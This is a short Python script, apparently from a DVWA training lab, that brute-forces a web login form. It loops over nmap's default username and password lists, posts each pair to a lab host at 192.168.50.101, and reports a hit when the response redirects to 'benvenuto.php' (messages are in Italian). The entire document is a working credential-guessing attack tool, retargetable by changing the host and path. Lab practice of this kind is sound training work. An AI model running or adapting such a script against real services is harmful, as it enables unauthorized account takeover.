import http.client, urllib.parse

username_file = open ('/usr/share/nmap/nselib/data/usernames.lst')
password_file = open ('/usr/share/nmap/nselib/data/passwords.lst')

user_list = username_file.readlines()
pwd_list = password_file.readlines()

for user in user_list:
	user = user.rstrip()
	for pwd in pwd_list:
		pwd = pwd.rstrip()

		print (user, "-", pwd)

		post_parameters  =  urllib.parse.urlencode ( {' username ' :  user,  'password' : pwd,  'Submit' :  "Submit" } )
		headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
		conn = http.client.HTTPConnection ( "192.168.50.101" , 80 )
		conn.request ("POST", "/dvwa/vulnerabilities/brute", post_parameters, headers)
		response = conn.getresponse()

		if(response.getheader('location') == "benvenuto.php"):
			print ("logged with:", user, " - ", pwd)
		else:
			print ("credenziali errate")

